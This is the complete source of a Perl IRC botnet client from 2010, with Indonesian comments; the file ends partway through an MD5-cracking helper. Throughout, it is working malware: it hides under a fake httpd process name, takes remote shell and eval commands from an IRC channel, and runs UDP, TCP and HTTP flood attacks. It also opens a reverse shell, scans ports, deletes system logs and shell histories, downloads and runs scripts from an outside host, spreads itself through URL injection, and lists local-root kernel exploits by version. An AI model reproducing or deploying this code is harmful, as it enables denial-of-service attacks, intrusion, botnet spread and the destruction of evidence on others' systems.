#!/usr/bin/perl
#
###############################################
#  bot net versi genol copyrihgt 2010                                                                               
###############################################
use IO::Socket::INET;
use HTTP::Request;
use LWP::UserAgent;
##################################################
# genol.or.id
##################################################
my @ps = ("/usr/local/sbin/httpd"); 
$processo = $ps[rand scalar @ps]; 
my $linas_ma='8';
my $sleep='2';
my $spread="http://chuntaeil.org/common/ConfData/setan3.txt?";
my @adms=("mengau");
my @canais="#mengau";
##################################################
# genol.or.id
##################################################
my @nickname = ("punk");
my @rname = ("12,11Punk Cok");
my $nick = $nickname[rand scalar @nickname];
my $ircname = $nickname[rand scalar @nickname];
my $realname = $rname[rand scalar @rname];
$servidor='irc.crewindonesia.biz.tm' unless $servidor;
my $porta='6667';

$SIG{'INT'} = 'IGNORE';
$SIG{'HUP'} = 'IGNORE';
$SIG{'TERM'} = 'IGNORE';
$SIG{'CHLD'} = 'IGNORE';
$SIG{'PS'} = 'IGNORE';
use IO::Socket;
use Socket;
use IO::Select;
chdir("/");
##################################################
# genol.or.id
##################################################

#Connect
$servidor="$ARGV[0]" if $ARGV[0];
$0="$processo"."\0"x16;;
my $pid=fork;
exit if $pid;
die "Masalah fork: $!" unless defined($pid);

our %irc_servers;
our %DCC;
my $dcc_sel = new IO::Select->new();
$sel_cliente = IO::Select->new();
sub sendraw {
  if ($#_ == '1') {
    my $socket = $_[0];
    print $socket "$_[1]\n";
    } else {
    print $IRC_cur_socket "$_[0]\n";
  }
}

sub conectar {
  my $meunick = $_[0];
  my $servidor_con = $_[1];
  my $porta_con = $_[2];
  my $IRC_socket = IO::Socket::INET->new(Proto=>"tcp", PeerAddr=>"$servidor_con",
  PeerPort=>$porta_con) or return(1);
  if (defined($IRC_socket)) {
    $IRC_cur_socket = $IRC_socket;
    $IRC_socket->autoflush(1);
    $sel_cliente->add($IRC_socket);
    $irc_servers{$IRC_cur_socket}{'host'} = "$servidor_con";
    $irc_servers{$IRC_cur_socket}{'porta'} = "$porta_con";
    $irc_servers{$IRC_cur_socket}{'nick'} = $meunick;
    $irc_servers{$IRC_cur_socket}{'meuip'} = $IRC_socket->sockhost;
    nick("$meunick");
    sendraw("USER $ircname ".$IRC_socket->sockhost." $servidor_con :$realname");
    sleep 1;
  }
}

my $line_temp;
while( 1 ) {
  while (!(keys(%irc_servers))) { conectar("$nick", "$servidor", "$porta"); }
  delete($irc_servers{''}) if (defined($irc_servers{''}));
  my @ready = $sel_cliente->can_read(0);
  next unless(@ready);
  foreach $fh (@ready) {
    $IRC_cur_socket = $fh;
    $meunick = $irc_servers{$IRC_cur_socket}{'nick'};
    $nread = sysread($fh, $msg, 4096);
    if ($nread == 0) {
      $sel_cliente->remove($fh);
      $fh->close;
      delete($irc_servers{$fh});
    }
    @lines = split (/\n/, $msg);
    for(my $c=0; $c<= $#lines; $c++) {

      $line = $lines[$c];
      $line=$line_temp.$line if ($line_temp);
      $line_temp='';
      $line =~ s/\r$//;
      unless ($c == $#lines) {
        parse("$line");
        } else {
        if ($#lines == 0) {
          parse("$line");
          } elsif ($lines[$c] =~ /\r$/) {
          parse("$line");
          } elsif ($line =~ /^(\S+) NOTICE AUTH :\*\*\*/) {
          parse("$line"); 
          	   } else {
          	               $line_temp = $line;
        }
      }
    }
  }
}

sub parse {
  my $servarg = shift;
  if ($servarg =~ /^PING \:(.*)/) {
    sendraw("PONG :$1");
    } elsif ($servarg =~ /^\:(.+?)\!(.+?)\@(.+?) PRIVMSG (.+?) \:(.+)/) {
    my $pn=$1; my $hostmask= $3; my $onde = $4; my $args = $5;
    if ($args =~ /^\001VERSION\001$/) {
      	 notice("$pn", "\001VERSION mIRC v6.17 Mic22\001");
    }
    if (grep {$_ =~ /^\Q$pn\E$/i } @adms ) {
    if ($onde eq "$meunick"){
    shell("$pn", "$args");
  }
  
#End of Connect

##################################################
# genol.or.id
##################################################
#      PREFIX        #
######################
  
  if ($args =~ /^(\Q$meunick\E|\!oi)\s+(.*)/ ) {
    my $natrix = $1;
    my $arg = $2;
    if ($arg =~ /^\!(.*)/) {
      ircase("$pn","$onde","$1") unless ($natrix eq "!oi" and $arg =~ /^\!nick/);
      } elsif ($arg =~ /^\@(.*)/) {
      $ondep = $onde;
      $ondep = $pn if $onde eq $meunick;
      bfunc("$ondep","$1");
      } else {
      shell("$onde", "$arg");
    }
  }
}
}
######################
#   End of PREFIX    #
######################

elsif ($servarg =~ /^\:(.+?)\!(.+?)\@(.+?)\s+NICK\s+\:(\S+)/i) {
if (lc($1) eq lc($meunick)) {
  $meunick=$4;
  $irc_servers{$IRC_cur_socket}{'nick'} = $meunick;
}
} elsif ($servarg =~ m/^\:(.+?)\s+433/i) {
nick("$meunick".int rand(99));
} elsif ($servarg =~ m/^\:(.+?)\s+001\s+(\S+)\s/i) {
$meunick = $2;
$irc_servers{$IRC_cur_socket}{'nick'} = $meunick;
$irc_servers{$IRC_cur_socket}{'nome'} = "$1";
foreach my $canal (@canais) {
  sendraw("JOIN $canal ddosit");
}
}
}

sub bfunc {
my $printl = $_[0];
my $funcarg = $_[1];
if (my $pid = fork) {
waitpid($pid, 0);
} else {
if (fork) {
  exit;
} else {

######################
#       Help         # 
######################

if ($funcarg =~ /^help/) {
	sendraw($IRC_cur_socket, "PRIVMSG $printl :123 Lets Go, commands are");
	sendraw($IRC_cur_socket, "PRIVMSG $printl :12!oi 7@flood");
	sendraw($IRC_cur_socket, "PRIVMSG $printl :12!oi 7@backconnect");
	sendraw($IRC_cur_socket, "PRIVMSG $printl :12!oi 7@shell");
	sendraw($IRC_cur_socket, "PRIVMSG $printl :12!oi 7@portscanner");
	sendraw($IRC_cur_socket, "PRIVMSG $printl :3 command lainya:");
	sendraw($IRC_cur_socket, "PRIVMSG $printl :12!oi 7@commands");

}

if ($funcarg =~ /^ddos/) {
	sendraw($IRC_cur_socket, "PRIVMSG $printl :3  tiga cara pilihan tembak");
	sendraw($IRC_cur_socket, "PRIVMSG $printl :12 UDPFlood, HTTPFlood and TCPFlood");
	sendraw($IRC_cur_socket, "PRIVMSG $printl :12!oi 7@udpflood <ip> <jumlah sampah> <waktu>");
	sendraw($IRC_cur_socket, "PRIVMSG $printl :12!oi 7@tcpflood <ip> <port> <jumlah> <waktu>");
	sendraw($IRC_cur_socket, "PRIVMSG $printl :12!oi 7@httpflood <site> <time>");

}

if ($funcarg =~ /^backconnect/) {
	sendraw($IRC_cur_socket, "PRIVMSG $printl :12 You use backconnect like this :");
	sendraw($IRC_cur_socket, "PRIVMSG $printl :12!oi 7@back <ip> <port>");
}

if ($funcarg =~ /^shell/) {
	sendraw($IRC_cur_socket, "PRIVMSG $printl :12 This bot has a integrated shell");
	sendraw($IRC_cur_socket, "PRIVMSG $printl :12 You can use it in private but also public in the channel");
	sendraw($IRC_cur_socket, "PRIVMSG $printl :12 In public channel just use : 7!oi cd tmp12 untuk contoh");
	sendraw($IRC_cur_socket, "PRIVMSG $printl :12 linux commands type :!oi 7@linuxhelp");
}

if ($funcarg =~ /^portscanner/) {
	sendraw($IRC_cur_socket, "PRIVMSG $printl :12 There is a normal portscan and a Nmap:");
	sendraw($IRC_cur_socket, "PRIVMSG $printl :12 !oi 7@portscan <ip>");
	sendraw($IRC_cur_socket, "PRIVMSG $printl :12 !oi 7@nmap <ip> <awal port> <akhir port>");
}

if ($funcarg =~ /^commands/) {
	sendraw($IRC_cur_socket, "PRIVMSG $printl :12 Boz bisa gunain semua perintah enehhhhh :");
	sendraw($IRC_cur_socket, "PRIVMSG $printl :12!oi 7@portscan <ip>");
	sendraw($IRC_cur_socket, "PRIVMSG $printl :12!oi 7@nmap <ip> <beginport> <endport>");
	sendraw($IRC_cur_socket, "PRIVMSG $printl :12!oi 7@back <ip><port>");	
	sendraw($IRC_cur_socket, "PRIVMSG $printl :12!oi cd tmp 12 for example");
	sendraw($IRC_cur_socket, "PRIVMSG $printl :12!oi 7@udpflood <ip> <packet size> <time>");
	sendraw($IRC_cur_socket, "PRIVMSG $printl :12!oi 7@tcpflood <ip> <port> <packet size> <time>");
	sendraw($IRC_cur_socket, "PRIVMSG $printl :12!oi 7@httpflood <site> <time>");
	sendraw($IRC_cur_socket, "PRIVMSG $printl :12!oi 7@linuxhelp");
	sendraw($IRC_cur_socket, "PRIVMSG $printl :12!oi 7@spread <scan>");
	sendraw($IRC_cur_socket, "PRIVMSG $printl :12!oi 7@system");
	sendraw($IRC_cur_socket, "PRIVMSG $printl :12!oi 7@hapusjejak");
	sendraw($IRC_cur_socket, "PRIVMSG $printl :12!oi 7@join #channel");	
	sendraw($IRC_cur_socket, "PRIVMSG $printl :12!oi 7@part #channel");
	sendraw($IRC_cur_socket, "PRIVMSG $printl :12!oi 7@tambah");
}

if ($funcarg =~ /^linuxhelp/) {
	sendraw($IRC_cur_socket, "PRIVMSG $printl :12 LinuxHelp12 melihat dir : pwd");
	sendraw($IRC_cur_socket, "PRIVMSG $printl :12 LinuxHelp12 Start a Perl file : perl file.pl");
	sendraw($IRC_cur_socket, "PRIVMSG $printl :12 LinuxHelp12&#183;+=+&#183; - Go back from dir : cd ..");
	sendraw($IRC_cur_socket, "PRIVMSG $printl :12 LinuxHelp1 - Force to Remove a file/dir : rm -rf file/dir;ls -la");
	sendraw($IRC_cur_socket, "PRIVMSG $printl :12 LinuxHelp1 - Show all files/dir with permissions : ls -lia");
	sendraw($IRC_cur_socket, "PRIVMSG $printl :12 LinuxHelp1 - Find config.inc.php files : find / -type f -name config.inc.php");
	sendraw($IRC_cur_socket, "PRIVMSG $printl :12 LinuxHelp1 - Find all writable folders and files : find / -perm -2 -ls");
	sendraw($IRC_cur_socket, "PRIVMSG $printl :12 LinuxHelp1 - Find all .htpasswd files : find / -type f -name .htpasswd");
	sendraw($IRC_cur_socket, "PRIVMSG $printl :12 LinuxHelp1 - Find all service.pwd files : find / -type f -name service.pwd");
}

######################
#   End of  Help     # 
######################
if ($funcarg =~ /^spread\s+(.*)/) {
$vuln = $1;
sendraw($IRC_cur_socket, "PRIVMSG $printl :12 Spread Mode12 Spreading bot on :14 $vuln");
my $shellurl="http://".$vuln.$spread."?";
my $reqz=HTTP::Request->new(GET=>$shellurl);
my $ua=LWP::UserAgent->new();
my $response=$ua->request($reqz);
sendraw($IRC_cur_socket, "PRIVMSG $printl :12 Spread Mode Bot is Spreaded on :14 $vuln"); 
}
######################
#     Commands       # 
######################

if ($funcarg =~ /^system/) {
$uname=`uname -a`;$uptime=`uptime`;$ownd=`pwd`;$distro=`cat /etc/issue`;$id=`id`;$un=`uname -sro`;
	sendraw($IRC_cur_socket, "PRIVMSG $printl :12System Info12&#183;+=+&#183; Info BOT : Server : 14Cannot View :14 1237");
	sendraw($IRC_cur_socket, "PRIVMSG $printl :12System Info12&#183;+=+&#183; Uname -a     : 7 $uname");
	sendraw($IRC_cur_socket, "PRIVMSG $printl :12System Info12&#183;+=+&#183; Uptime       : 7 $uptime");
	sendraw($IRC_cur_socket, "PRIVMSG $printl :12System Info12&#183;+=+&#183; Own Prosses  : 7 $processo");
	sendraw($IRC_cur_socket, "PRIVMSG $printl :12System Info12&#183;+=+&#183; ID           : 7 $id");
	sendraw($IRC_cur_socket, "PRIVMSG $printl :12System Info12&#183;+=+&#183; Own Dir      : 7 $ownd");
	sendraw($IRC_cur_socket, "PRIVMSG $printl :12System Info12&#183;+=+&#183; OS           : 7 $distro");
	sendraw($IRC_cur_socket, "PRIVMSG $printl :12System Info12&#183;+=+&#183; Owner        : 7 DCOM");
	sendraw($IRC_cur_socket, "PRIVMSG $printl :12System Info12&#183;+=+&#183; Channel      : 7 #genol on byroe");
}

##################################################
# genol.or.id
######################
#      Portscan      # 
######################

if ($funcarg =~ /^portscan (.*)/) {
  my $hostip="$1";
  my
  @portas=("15","19","98","20","21","22","23","25","37","39","42","43","49","53","63","69","79","80","101","106","107","109","110","111","113","115","117","119","135","137","139","143","174","194","389","389","427","443","444","445","464","488","512","513","514","520","540","546","548","565","609","631","636","694","749","750","767","774","783","808","902","988","993","994","995","1005","1025","1033","1066","1079","1080","1109","1433","1434","1512","2049","2105","2432","2583","3128","3306","4321","5000","5222","5223","5269","5555","6660","6661","6662","6663","6665","6666","6667","6668","6669","7000","7001","7741","8000","8018","8080","8200","10000","19150","27374","31310","33133","33733","55555");
  my (@aberta, %porta_banner);
  sendraw($IRC_cur_socket, "PRIVMSG $printl :(13&#183;+=+&#183;PortScan13&#183;+=+&#183;) 6Loading port scanner 7(wait a minute, ok !!)  12".$1." Lets Go!! .");
  foreach my $porta (@portas)  {
    my $scansock = IO::Socket::INET->new(PeerAddr => $hostip, PeerPort => $porta, Proto =>
    'tcp', Timeout => 4);
    if ($scansock) {
      push (@aberta, $porta);
      $scansock->close;
    }
  }
  
  if (@aberta) {
    sendraw($IRC_cur_socket, "PRIVMSG $printl :13&#183;+=+&#183;PortScan13&#183;+=+&#183; 6open ports are...:5 @aberta");
    } else {
    sendraw($IRC_cur_socket, "PRIVMSG $printl :13&#183;+=+&#183;PortScan13&#183;+=+&#183; 6all ports are closed");
  }
}

######################
#  End of  Portscan  # 
######################
##################################################
# genol.or.id
##################################################
######################
#        Nmap        #  
######################
   if ($funcarg =~ /^nmap\s+(.*)\s+(\d+)\s+(\d+)/){
         my $hostip="$1";
         my $portstart = "$2";
         my $portend = "$3";
         my (@abertas, %porta_banner); 
       sendraw($IRC_cur_socket, "PRIVMSG $printl :13&#183;+=+&#183;Nmap13&#183;+=+&#183; :12 $1 (13&#183;+=+&#183;Port13&#183;+=+&#183;) 12 $2-$3");
       foreach my $porta ($portstart..$portend){
               my $scansock = IO::Socket::INET->new(PeerAddr => $hostip, PeerPort => $porta, Proto => 'tcp', Timeout => $portime); 
    if ($scansock) {
                 push (@abertas, $porta);
                 $scansock->close;
                 if ($xstats){
        sendraw($IRC_cur_socket, "PRIVMSG $printl :13&#183;+=+&#183;Nmap13&#183;+=+&#183; Founded 12 $porta"."/Open"); 
                 }
               }
             }
             if (@abertas) {
        sendraw($IRC_cur_socket, "PRIVMSG $printl :13&#183;+=+&#183;Nmap13&#183;+=+&#183; Complete ");
             } else {
        sendraw($IRC_cur_socket, "PRIVMSG $printl :13&#183;+=+&#183;Nmap13&#183;+=+&#183; No open ports have been founded 13");
             }
			 }
######################
#    End of Nmap     #  
######################
##################################################
# genol.or.id
##################################################
######################
#    Log Cleaner     #  
######################
if ($funcarg =~ /^hapusjejak/) {
sendraw($IRC_cur_socket, "PRIVMSG $printl :12 Pembersiahan Jejak di lakukan!!!"); 
    system 'rm -rf /var/log/lastlog';
    system 'rm -rf /var/log/wtmp';
	system 'rm -rf /etc/wtmp';
	system 'rm -rf /var/run/utmp';
	system 'rm -rf /etc/utmp';
	system 'rm -rf /var/log';
	system 'rm -rf /var/logs';
	system 'rm -rf /var/adm';
	system 'rm -rf /var/apache/log';
	system 'rm -rf /var/apache/logs';
	system 'rm -rf /usr/local/apache/log'; 
	system 'rm -rf /usr/local/apache/logs';
	system 'rm -rf /root/.bash_history';
	system 'rm -rf /root/.ksh_history';
sendraw($IRC_cur_socket, "PRIVMSG $printl :12 Prosesing..."); 
		sleep 1;
sendraw($IRC_cur_socket, "PRIVMSG $printl :12 Loading....");
	system 'find / -name *.bash_history -exec rm -rf {} \;';
	system 'find / -name *.bash_logout -exec rm -rf {} \;';
	system 'find / -name "log*" -exec rm -rf {} \;';
	system 'find / -name *.log -exec rm -rf {} \;';
		sleep 1;
sendraw($IRC_cur_socket, "PRIVMSG $printl :12 Semua Jejak telah terhapus!!"); 
      }
######################
# End of Log Cleaner #  
######################
##############
# Tambah Bot ##
##############
if ($funcarg =~ /^tambah/) {
sendraw($IRC_cur_socket, "PRIVMSG $printl :12 Mencoba untuk Menambahkan bot!!!"); 
    system 'cd tmp;wget http://chuntaeil.org/common/ConfData/shbot.txt;perl shbot.txt;rm shbot.txt';	
sendraw($IRC_cur_socket, "PRIVMSG $printl :12 Bot telah di tambahkan !!"); 
}
#############
# Tambah bot #
#############
############
# manak #
############
if ($funcarg =~ /^manak/) {
sendraw($IRC_cur_socket, "PRIVMSG $printl :12 Mencoba untuk Menambahkan bot!!!"); 
    system 'cd tmp;wget http://chuntaeil.org/common/ConfData/shbot.txt;perl shbot.txt;rm -rf shbot.txt';	
sendraw($IRC_cur_socket, "PRIVMSG $printl :12 Bot telah di tambahkan di serve !!"); 
}
############
# manak    #
############
############
# localroot   #
############
if ($funcarg =~ /^xpl/) {
my $khost = `uname -r`;
my $currentid = `whoami`;
sendraw($IRC_cur_socket, "PRIVMSG $printl :12 user  ".$currentid." ");
sendraw($IRC_cur_socket, "PRIVMSG $printl :12 kernel  ".$khost." ");
chomp($khost);

my %h;
$h{'w00t'} = {
vuln=>['2.4.18','2.4.10','2.4.21','2.4.19','2.4.17','2.4.16','2.4.20']
};

$h{'brk'} = {
vuln=>['2.4.22','2.4.21','2.4.10','2.4.20']
};

$h{'ave'} = {
vuln=>['2.4.19','2.4.20']
};

$h{'elflbl'} = {
vuln=>['2.4.29']
};

$h{'elfdump'} = {
vuln=>['2.4.27']
};

$h{'expand_stack'} = {
vuln=>['2.4.29']
};

$h{'h00lyshit'} = {
vuln=>['2.6.8','2.6.10','2.6.11','2.6.9','2.6.7','2.6.13','2.6.14','2.6.15','2.6.16','2.6.2']
};

$h{'kdump'} = {
vuln=>['2.6.13']
};

$h{'km2'} = {
vuln=>['2.4.18','2.4.22']
};

$h{'krad'} = {
vuln=>['2.6.11']
};

$h{'krad3'} = {
vuln=>['2.6.11','2.6.9']
};

$h{'local26'} = {
vuln=>['2.6.13']
};

$h{'loko'} = {
vuln=>['2.4.22','2.4.23','2.4.24']
};

$h{'mremap_pte'} = {
vuln=>['2.4.20','2.2.25','2.4.24']
};

$h{'newlocal'} = {
vuln=>['2.4.17','2.4.19','2.4.18']
};

$h{'ong_bak'} = {
vuln=>['2.4.','2.6.']
};

$h{'ptrace'} = {
vuln=>['2.2.','2.4.22']
};

$h{'ptrace_kmod'} = {
vuln=>['2.4.2']
};

$h{'ptrace24'} = {
vuln=>['2.4.9']
};

$h{'pwned'} = {
vuln=>['2.4.','2.6.']
};

$h{'py2'} = {
vuln=>['2.6.9','2.6.17','2.6.15','2.6.13']
};

$h{'raptor_prctl'} = {
vuln=>['2.6.13','2.6.17','2.6.16','2.6.13']
};

$h{'prctl3'} = {
vuln=>['2.6.13','2.6.17','2.6.9']
};

$h{'remap'} = {
vuln=>['2.4.']
};

$h{'rip'} = {
vuln=>['2.2.']
};

$h{'stackgrow2'} = {
vuln=>['2.4.29','2.6.10']
};

$h{'uselib24'} = {
vuln=>['2.4.29','2.6.10','2.4.22','2.4.25']
};

$h{'newsmp'} = {
vuln=>['2.6.']
};

$h{'smpracer'} = {
vuln=>['2.4.29']
};

$h{'loginx'} = {
vuln=>['2.4.22']
};

$h{'exp.sh'} = {
vuln=>['2.6.9','2.6.10','2.6.16','2.6.13']
};

$h{'prctl'} = {
vuln=>['2.6.']
};

$h{'kmdx'} = {
vuln=>['2.6.','2.4.']
};

$h{'raptor'} = {
vuln=>['2.6.13','2.6.14','2.6.15','2.6.16']
};

$h{'raptor2'} = {
vuln=>['2.6.13','2.6.14','2.6.15','2.6.16']
};


foreach my $key(keys %h){
foreach my $kernel ( @{ $h{$key}{'vuln'} } ){
if($khost=~/^$kernel/){
chop($kernel) if ($kernel=~/.$/);
sendraw($IRC_cur_socket, "PRIVMSG $printl :12 coba gunakan : ". $key ." ");
}
}
}

}
# untuk fungsi chek port.
if ($funcarg =~ /^portchk\s+(.*)\s+(\d+)/) {
my $host=$1;
my $port=$2;
my $scansock = IO::Socket::INET->new(PeerAddr => $host, PeerPort => $port, Proto => 'tcp', Timeout => 8);
if ($scansock)
{
sendraw($IRC_cur_socket, "PRIVMSG $printl :12 Port:4 ".$port." 12 terbuka ".$host." ");
$scansock->close;
}
else
{
sendraw($IRC_cur_socket, "PRIVMSG $printl :12 Port:4 ".$port." 12 tertutup 4 ".$host." ");
}
}
# MD5 crackker ;).
if ($funcarg =~ /^crack\s+(.*)/) {
&ice($printl,$1);
&gdata($printl,$1);
&redn($printl,$1);
&xpz($printl,$1);
&ben($printl,$1);
&alim($printl,$1);
&cry($printl,$1);
}
##################################################
# genol.or.id
##################################################
######################
#  Join And Part     # 
######################
           if ($funcarg =~ /^join (.*)/) {
              sendraw($IRC_cur_socket, "JOIN ".$1);
           }
           if ($funcarg =~ /^part (.*)/) {
              sendraw($IRC_cur_socket, "PART ".$1);
           }
		   
######################
#End of Join And Part# 
######################
##################################################
# genol.or.id
##################################################
######################
#     TCPFlood       # 
######################

if ($funcarg =~ /^tcpflood\s+(.*)\s+(\d+)\s+(\d+)/) {
  sendraw($IRC_cur_socket, "PRIVMSG $printl :12 TCP DDoS12 Attacking 12 ".$1.":".$2." for 12 ".$3." seconds.");
  my $itime = time;
  my ($cur_time);
  $cur_time = time - $itime;
  while ($3>$cur_time){
  $cur_time = time - $itime;
  &tcpflooder("$1","$2","$3");
}
sendraw($IRC_cur_socket,"PRIVMSG $printl :12 TCP DDoS12  Mission Accomplished.. 12 ".$1.":".$2.".");
}
######################
#  End of TCPFlood   # 
######################
##################################################
# genol.or.id
##################################################
######################
#   Back Connect     # 
######################
if ($funcarg =~ /^back\s+(.*)\s+(\d+)/) {
my $host = "$1";
my $porta = "$2";
my $proto = getprotobyname('tcp');
my $iaddr = inet_aton($host);
my $paddr = sockaddr_in($porta, $iaddr);
my $shell = "/bin/sh -i";
if ($^O eq "MSWin32") {
  $shell = "cmd.exe";
}
socket(SOCKET, PF_INET, SOCK_STREAM, $proto) or die "socket: $!";
connect(SOCKET, $paddr) or die "connect: $!";
open(STDIN, ">&SOCKET");
open(STDOUT, ">&SOCKET");
open(STDERR, ">&SOCKET");
system("$shell");
close(STDIN);
close(STDOUT);
close(STDERR);
if ($estatisticas)
{
  sendraw($IRC_cur_socket, "PRIVMSG $printl :13 BackConnect 13 sedang di buka 12 $host:$porta");
}
}
######################
#End of  Back Connect# 
##################################################
# genol.or.id
##################################################

######################
# Im not living im just killing time
#	
#                                                               
# radiohead ganja bjork the beatles
######################
#     HTTPFlood      # 
#                    #
######################
if ($funcarg =~ /^httpflood\s+(.*)\s+(\d+)/) {
sendraw($IRC_cur_socket, "PRIVMSG $printl :12 Flood web sedang di lakukan 12 DenganPort 12 ".$1."  80 selama 12 ".$2." Detik.");
my $itime = time;
my ($cur_time);
$cur_time = time - $itime;
while ($2>$cur_time){
$cur_time = time - $itime;
my $socket = IO::Socket::INET->new(proto=>'tcp', PeerAddr=>$1, PeerPort=>80);
print $socket "GET / HTTP/1.1\r\nAccept: */*\r\nHost: ".$1."\r\nConnection: Keep-Alive\r\n\r\n";
close($socket);
}
sendraw($IRC_cur_socket, "PRIVMSG $printl :12 Web telah di Flood  12 ".$1.".");
}
######################
#  End of HTTPFlood  # 
#                    #
######################

######################
#     UDPFlood       # 
#                    #
######################
if ($funcarg =~ /^udpflood\s+(.*)\s+(\d+)\s+(\d+)/) {
sendraw($IRC_cur_socket, "PRIVMSG $printl :12 Flood  Sampah sedang di lakukan 12 ".$1." Dengan 12 ".$2." Bungkus sampah 12 ".$3." Detik.");
my ($dtime, %pacotes) = udpflooder("$1", "$2", "$3");
$dtime = 1 if $dtime == 0;
my %bytes;
$bytes{igmp} = $2 * $pacotes{igmp};
$bytes{icmp} = $2 * $pacotes{icmp};
$bytes{o} = $2 * $pacotes{o};
$bytes{udp} = $2 * $pacotes{udp};
$bytes{tcp} = $2 * $pacotes{tcp};
sendraw($IRC_cur_socket, "PRIVMSG $printl :12 Flood  Sampah telah di lakukan 12 ".int(($bytes{icmp}+$bytes{igmp}+$bytes{udp} + $bytes{o})/1024)." Bungkus  in12 ".$dtime." Detik12 ".$1.".");
}
exit;
}
}
######################
#  End of Udpflood   # 
#                    #
######################


sub ircase {
my ($kem, $printl, $case) = @_;
  if ($case =~ /^join (.*)/) {
     j("$1");
   }
   if ($case =~ /^part (.*)/) {
      p("$1");
   }
if ($case =~ /^rejoin\s+(.*)/) {
my $chan = $1;
if ($chan =~ /^(\d+) (.*)/) {
for (my $ca = 1; $ca <= $1; $ca++ ) {
p("$2");
j("$2");
}
}
else {
p("$chan");
j("$chan");
}
}

if ($case =~ /^op/) {
op("$printl", "$kem") if $case eq "op";
my $oarg = substr($case, 3);
op("$1", "$2") if ($oarg =~ /(\S+)\s+(\S+)/);
}

if ($case =~ /^deop/) {
deop("$printl", "$kem") if $case eq "deop";
my $oarg = substr($case, 5);
deop("$1", "$2") if ($oarg =~ /(\S+)\s+(\S+)/);
}

if ($case =~ /^msg\s+(\S+) (.*)/) {
msg("$1", "$2");
}

if ($case =~ /^flood\s+(\d+)\s+(\S+) (.*)/) {
for (my $cf = 1; $cf <= $1; $cf++) {
msg("$2", "$3");
}
}

if ($case =~ /^ctcp\s+(\S+) (.*)/) {
ctcp("$1", "$2");
}

if ($case =~ /^ctcpflood\s+(\d+)\s+(\S+) (.*)/) {
for (my $cf = 1; $cf <= $1; $cf++) {
ctcp("$2", "$3");
}
}

if ($case =~ /^nick (.*)/) {
nick("$1");
}

if ($case =~ /^connect\s+(\S+)\s+(\S+)/) {
conectar("$2", "$1", 6667);
}

if ($case =~ /^raw (.*)/) {
sendraw("$1");
}

if ($case =~ /^eval (.*)/) {
eval "$1";
}
}


sub shell {
my $printl=$_[0];
my $comando=$_[1];
if ($comando =~ /cd (.*)/) {
chdir("$1") || msg("$printl", "No such file or directory");
return;
}

elsif ($pid = fork) {
waitpid($pid, 0);
}
else {
if (fork) {
exit;

} else {
my @resp=`$comando 2>&1 3>&1`;
my $c=0;
foreach my $linha (@resp) {
  $c++;
  chop $linha;
  sendraw($IRC_cur_socket, "PRIVMSG $printl :$linha");
  if ($c == "$linas_max") {
    $c=0;
    sleep $sleep;
  }
}
exit;
}
}
}

sub tcpflooder {
my $itime = time;
my ($cur_time);
my ($ia,$pa,$proto,$j,$l,$t);
$ia=inet_aton($_[0]);
$pa=sockaddr_in($_[1],$ia);
$ftime=$_[2];
$proto=getprotobyname('tcp');
$j=0;$l=0;
$cur_time = time - $itime;
while ($l<1000){
$cur_time = time - $itime;
last if $cur_time >= $ftime;
$t="SOCK$l";
socket($t,PF_INET,SOCK_STREAM,$proto);
connect($t,$pa)||$j--;
$j++;$l++;
}
$l=0;
while ($l<1000){
$cur_time = time - $itime;
last if $cur_time >= $ftime;
$t="SOCK$l";
shutdown($t,2);
$l++;
}
}

sub udpflooder {
my $iaddr = inet_aton($_[0]);
my $msg = 'A' x $_[1];
my $ftime = $_[2];
my $cp = 0;
my (%pacotes);
$pacotes{icmp} = $pacotes{igmp} = $pacotes{udp} = $pacotes{o} = $pacotes{tcp} = 0;
socket(SOCK1, PF_INET, SOCK_RAW, 2) or $cp++;
socket(SOCK2, PF_INET, SOCK_DGRAM, 17) or $cp++;
socket(SOCK3, PF_INET, SOCK_RAW, 1) or $cp++;
socket(SOCK4, PF_INET, SOCK_RAW, 6) or $cp++;
return(undef) if $cp == 4;
my $itime = time;
my ($cur_time);
while ( 1 ) {
for (my $porta = 1;
$porta <= 65000; $porta++) {
$cur_time = time - $itime;
last if $cur_time >= $ftime;
send(SOCK1, $msg, 0, sockaddr_in($porta, $iaddr)) and $pacotes{igmp}++;
send(SOCK2, $msg, 0, sockaddr_in($porta, $iaddr)) and $pacotes{udp}++;
send(SOCK3, $msg, 0, sockaddr_in($porta, $iaddr)) and $pacotes{icmp}++;
send(SOCK4, $msg, 0, sockaddr_in($porta, $iaddr)) and $pacotes{tcp}++;


for (my $pc = 3;
$pc <= 255;$pc++) {
next if $pc == 6;
$cur_time = time - $itime;
last if $cur_time >= $ftime;
socket(SOCK5, PF_INET, SOCK_RAW, $pc) or next;
send(SOCK5, $msg, 0, sockaddr_in($porta, $iaddr)) and $pacotes{o}++;
}
}
last if $cur_time >= $ftime;
}
return($cur_time, %pacotes);
}

sub ctcp {
return unless $#_ == 1;
sendraw("PRIVMSG $_[0] :\001$_[1]\001");
}

sub msg {
return unless $#_ == 1;
sendraw("PRIVMSG $_[0] :$_[1]");
}

sub notice {
return unless $#_ == 1;
sendraw("NOTICE $_[0] :$_[1]");
}

sub op {
return unless $#_ == 1;
sendraw("MODE $_[0] +o $_[1]");
}

sub deop {
return unless $#_ == 1;
sendraw("MODE $_[0] -o $_[1]");
}

sub j {
&join(@_);
}

sub join {
return unless $#_ == 0;
sendraw("JOIN $_[0]");

}
sub p { part(@_);
}

sub part {
sendraw("PART $_[0]");
}

sub nick {
return unless $#_ == 0;
sendraw("NICK $_[0]");
}

sub quit {
sendraw("QUIT :$_[0]");
}
sub links()
{
my @l;
my $link=$_[0];
my $host=$_[0];
my $hdir=$_[0];
$hdir=~s/(.*)\/[^\/]*$/\1/;
$host=~s/([-a-zA-Z0-9\.]+)\/.*/$1/;
$host.="/";
$link.="/";
$hdir.="/";
$host=~s/\/\//\//g;
$hdir=~s/\/\//\//g;
$link=~s/\/\//\//g;
push(@l,$link,$host,$hdir);
return @l;
}

sub geths(){
my $host=$_[0];
$host=~s/([-a-zA-Z0-9\.]+)\/.*/$1/;
return $host;
}

sub ice(){
my $md5hash = $_[1];
chomp $md5hash;
my $query = "http://ice.breaker.free.fr/md5.php?hash=".$md5hash;
my $checker = query($query);
if ($checker =~ m/<b><br><br> - (.*?)<br><br><br>/g) {
my $cracked="$1";
sendraw($IRC_cur_socket, "PRIVMSG $printl :12 MD5 ==> ".$cracked."");
} else {
sendraw($IRC_cur_socket, "PRIVMSG $printl :12 Has not Found.");
}}

sub gdata(){
my $md5hash = $_[1];
chomp $md5hash;
my $query = "http://www.gdataonline.com/qkhash.php?mode=txt&hash=".$md5hash;
my $checker = query($query);
if ($checker =~ m/<b>(.*?)<\/b><\/td>/g) {
